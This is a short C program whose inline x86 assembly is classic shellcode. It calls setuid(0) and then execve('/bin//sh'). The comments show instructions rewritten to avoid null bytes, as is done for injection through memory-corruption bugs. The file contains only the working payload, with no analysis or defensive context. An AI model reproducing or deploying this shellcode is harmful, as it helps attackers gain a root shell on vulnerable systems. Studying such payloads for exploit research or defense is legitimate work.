int main() {
__asm__(
  "xor    %ebx,%ebx; " // "mov    $0x0,%ebx; "
  "xor    %eax,%eax; " // "mov    $0xd5,%eax; "
  "movb   $0xd5,%al; " // "mov    $0xd5,%eax; "
  "int    $0x80      ;"

  "xorl   %eax,%eax;"
  "pushl  %eax;"
  "pushl  $0x68732f2f;"
  "pushl  $0x6e69622f;"
  "movl   %esp,%ebx  ;"
  "pushl  %eax       ;"
  "pushl  %ebx       ;"
  "movl   %esp,%ecx  ;"
  "cdq              ;"
  "movb   $0x0b,%al  ;"
  "int    $0x80      ;"
);
}
